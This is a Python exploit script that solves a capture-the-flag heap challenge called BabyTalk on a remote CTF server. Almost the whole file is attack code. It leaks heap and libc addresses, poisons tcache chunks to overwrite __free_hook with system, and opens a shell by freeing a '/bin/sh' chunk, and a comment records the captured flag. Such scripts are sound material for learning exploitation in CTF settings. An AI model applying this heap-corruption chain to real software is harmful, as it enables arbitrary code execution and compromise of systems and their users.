#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'mc.ax', 'port':32526})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_malloc_hook = libc.symbols['__malloc_hook']
ofs_libc_mainarena   = ofs_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    bt = BabyTalk(conn)

    bt.str(0x418, b'a'*8)   # 0
    bt.str(0x28, b'b'*8)    # 1
    bt.str(0x28, b'c'*8)    # 2
    bt.dele(1)
    bt.dele(2)

    bt.str(0x28, b'\x80')   # 1

    addr_heap_base = u(bt.tok(1, b'\xcc')) - 0x680
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    bt.str(0x28, flat(0, 0x51, addr_heap_base+0x680, addr_heap_base+0x680))   # 2

    bt.dele(0)
    bt.str(0x418, b'\xa0')  # 0

    addr_libc_mainarena = u(bt.tok(0, b'\xcc')) - 0x60
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
    addr_libc_free_hook = libc.symbols['__free_hook']

    bt.str(0x4e8, b'A'*8)   # 3
    bt.str(0x418, flat(0, 0x21, 0xdeadbeef, 0xcafebabe, 0, 0x11))   # 4
    bt.dele(3)
    bt.dele(4)

    bt.str(0x528, b'B'*8)   # 3

    bt.dele(1)
    bt.str(0x28, b'x'*0x28) # 1
    bt.tok(1, b'\x31')
    bt.dele(1)
    bt.str(0x28, b'y'*0x20+p64(0x50)) # 1

    bt.dele(1)
    bt.dele(3)

    bt.str(0x48, b'z'*0x18 + flat(0x31, addr_libc_free_hook)) # 1
    bt.str(0x28, b'/bin/sh\x00') # 3
    bt.str(0x28, p64(addr_libc_system)) # 4

    bt.dele(3)

class BabyTalk:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def str(self, size, data):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'size? ', str(size).encode())
        self.sendafter(b'str? ', data)

    def tok(self, idx, delim):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'idx? ', str(idx).encode())
        self.sendlineafter(b'delim? ', delim)
        return delim.join(self.recvuntil(b'\n1.', drop=True).split())

    def dele(self, idx):
        self.sendlineafter(b'> ', b'3')
        self.sendlineafter(b'idx? ', str(idx).encode())

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # dice{tkjctf_lmeow_fee9c2ee3952d7b9479306ddd8e477ca}

if __name__=='__main__':
    main()

#==========
